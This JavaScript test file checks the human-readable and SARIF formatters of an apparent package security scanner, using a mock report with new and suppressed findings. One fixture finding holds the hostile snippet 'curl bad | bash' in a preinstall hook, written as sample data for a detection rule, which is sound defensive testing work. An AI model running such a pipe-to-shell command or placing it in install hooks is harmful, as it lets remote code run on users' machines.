import assert from "node:assert/strict";
import test from "node:test";
import { formatHuman, formatSarif } from "../packages/output/src/index.mjs";

function buildReport() {
  return {
    meta: {
      tool: "omsf",
      version: "1.0.0",
      targetPath: "/repo",
      generatedAt: "2026-03-25T00:00:00.000Z",
      rulePackId: "test",
      rulePackVersion: "1.0.0",
      baselineUsed: true
    },
    findings: [
      {
        ruleId: "owasp.a03.remote-stream-shell",
        title: "Remote stream to shell",
        message: "Remote content piped to shell",
        severity: "critical",
        confidence: "high",
        effectiveWeight: 8,
        path: "/repo/package.json",
        hook: "preinstall",
        snippet: "curl bad | bash",
        tags: ["owasp-a03"],
        fingerprint: "npm|owasp.a03.remote-stream-shell|preinstall|package.json",
        isNew: true
      }
    ],
    suppressedFindings: [
      {
        ruleId: "owasp.a05.insecure-tls-config",
        path: "/repo/package.json",
        suppression: {
          reason: "Temporary exception",
          expiresOn: "2099-01-01T00:00:00.000Z"
        }
      }
    ],
    summary: {
      findingCount: 1,
      suppressedCount: 1,
      newFindingCount: 1,
      totalScore: 8,
      highestSeverity: "critical",
      risk: "HIGH"
    },
    decision: {
      status: "fail",
      mode: "fail-on-new"
    },
    policy: {}
  };
}

test("human formatter includes new and suppressed sections", () => {
  const output = formatHuman(buildReport());
  assert.match(output, /Decision mode: fail-on-new/);
  assert.match(output, /\[NEW\]/);
  assert.match(output, /\[SUPPRESSED\]/);
});

test("sarif formatter includes fingerprint and new flag properties", () => {
  const sarif = JSON.parse(formatSarif(buildReport()));
  const result = sarif.runs[0].results[0];
  assert.equal(result.partialFingerprints.primaryLocationLineHash.includes("owasp.a03"), true);
  assert.equal(result.properties.isNew, true);
});
